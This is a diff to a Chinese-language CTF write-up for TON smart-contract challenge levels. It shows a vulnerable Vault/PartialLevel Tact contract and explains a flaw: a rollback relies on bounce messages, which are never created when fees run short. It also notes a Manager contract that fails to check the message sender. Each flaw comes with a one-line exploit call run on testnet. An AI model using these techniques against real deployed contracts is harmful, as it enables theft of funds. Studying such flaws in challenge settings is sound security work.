@@ -428,6 +428,7 @@ tags:
     ```
 
 - 只有 `manager` 能设置合约的所有者，而初始 `manager` 为 `Manager` 合约
+- 合约 `Manager` 不检查 `ChangeClientOwner` 消息的发送者
 
     ```js
     message(0x6f13c225) ChangeClientOwner {
@@ -440,3 +441,179 @@ tags:
     ```js
     > await player.send({to: Address.parse("kQCi5Sne638i1fdoGMK7cnKPVuQWgyGO4N4LxneLonWwvgZ_"), value: toNano("0.01"), body: beginCell().storeUint(0x6f13c225, 32).storeAddress(player.address).endCell()});
     ```
+
+## 5. PARTIAL
+
+> The goal of this level is to hack the vault contract below.
+> 
+> You are given 100 tokens to start with and you will beat the level if you manage to acquire 1000 or more.
+
+??? note "PartialLevel"
+
+    ```js
+    import "@stdlib/ownable";
+    import "@stdlib/deploy";
+    import "./messages";
+
+    message DepositToVault {
+        amount: Int as coins;
+    }
+
+    message WithdrawFromVault {
+        amount: Int as coins;
+    }
+
+    message DepositInternal {
+        amount: Int as coins;
+    }
+
+    message WithdrawInternal {
+        amount: Int as coins;
+    }
+
+    contract Vault with Ownable, Deployable {
+        owner: Address;
+        nonce: Int;
+        balance: Int as coins = 500;
+
+        init(owner: Address, nonce: Int) {
+            self.owner = owner;
+            self.nonce = nonce;
+        }
+
+        receive(msg: DepositInternal) {
+            self.requireOwner();
+            self.balance += msg.amount;
+        }
+
+        receive(msg: WithdrawInternal) {
+            self.requireOwner();
+            require(self.balance >= msg.amount, "Not enough balance.");
+            self.balance -= msg.amount;
+        }
+
+        get fun balance(): Int {
+            return self.balance;
+        }
+    }
+
+    contract PartialLevel with Deployable {
+        player: Address;
+        nonce: Int;
+        vault: Address;
+        balance: Int as coins = 100;
+
+        init(player: Address, nonce: Int) {
+            self.player = player;
+            self.nonce = nonce;
+
+            let level_init: StateInit = initOf Vault(myAddress(), nonce);
+            self.vault = contractAddress(level_init);
+            send(SendParameters{
+                to: self.vault,
+                value: ton("0.01"),
+                bounce: false,
+                data: level_init.data,
+                code: level_init.code
+            });
+        }
+
+        receive(msg: DepositToVault) {
+            require(self.balance >= msg.amount, "Not enough balance.");
+            self.balance -= msg.amount;
+            send(SendParameters{
+                to: self.vault,
+                value: 0,
+                bounce: false,
+                mode: SendRemainingValue,
+                body: DepositInternal{
+                    amount: msg.amount
+                }.toCell()
+            });
+        }
+
+        receive(msg: WithdrawFromVault) {
+            self.balance += msg.amount;
+            send(SendParameters{
+                to: self.vault,
+                value: 0,
+                bounce: true,
+                mode: SendRemainingValue,
+                body: WithdrawInternal{
+                    amount: msg.amount
+                }.toCell()
+            });
+        }
+
+        bounced(msg: WithdrawInternal) {
+            self.balance -= msg.amount;
+        }
+
+        receive("check") {
+            send(SendParameters{
+                to: sender(),
+                value: 0,
+                mode: SendRemainingValue,
+                bounce: false,
+                body: CheckLevelResult{
+                    name: "partial",
+                    completed: self.balance >= 1000
+                }.toCell()
+            });
+        }
+
+        get fun balance(): Int {
+            return self.balance;
+        }
+    }
+    ```
+
+- 通过 `WithdrawFromVault` 可以增加合约的余额，但若 `WithdrawInternal` 执行失败，将回弹消息并回滚余额
+
+    ```js
+    contract Vault with Ownable, Deployable {
+        // [...]
+
+        receive(msg: WithdrawInternal) {
+            self.requireOwner();
+            require(self.balance >= msg.amount, "Not enough balance.");
+            self.balance -= msg.amount;
+        }
+
+        // [...]
+    }
+
+    contract PartialLevel with Deployable {
+        // [...]
+
+        receive(msg: WithdrawFromVault) {
+            self.balance += msg.amount;
+            send(SendParameters{
+                to: self.vault,
+                value: 0,
+                bounce: true,
+                mode: SendRemainingValue,
+                body: WithdrawInternal{
+                    amount: msg.amount
+                }.toCell()
+            });
+        }
+
+        bounced(msg: WithdrawInternal) {
+            self.balance -= msg.amount;
+        }
+
+        // [...]
+    }
+    ```
+
+- 在 TON 中， 如果支付的费用不足以完成执行，则不会创建回弹消息。因此只需要支付仅供 `WithdrawFromVault` 执行的费用，使余额增加即可
+
+    ```js
+    > await contract.send(player, {value: toNano("0.005")}, {$$type: "WithdrawFromVault", amount: 900});
+    // https://testnet.tonviewer.com/transaction/407df39b95d852f44d1b1a9b8176bc68a44701bc2afabd7b069110faba553a5f
+    ```
+
+### References
+
+- [Internal message](https://docs.ton.org/v3/documentation/smart-contracts/transaction-fees/accept-message-effects#internal-message)
